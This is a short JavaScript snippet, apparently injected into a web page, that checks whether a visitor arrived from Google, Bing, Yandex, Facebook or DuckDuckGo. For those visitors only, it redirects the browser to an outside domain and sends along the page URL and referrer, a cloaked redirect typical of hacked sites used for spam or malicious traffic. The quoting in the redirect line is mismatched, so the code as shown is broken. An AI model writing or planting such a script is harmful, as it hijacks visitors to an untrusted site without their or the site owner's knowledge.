//<![CDATA[
    if(document.referrer)
    {
    	var cek = document.referrer;
    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.') || cek.includes('duckduckgo.');
      if(is_se)
    	{
    		var url = window.location.href;
    		window.location = "https://goldfieldupc.com/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
    	}
    }
//]]>
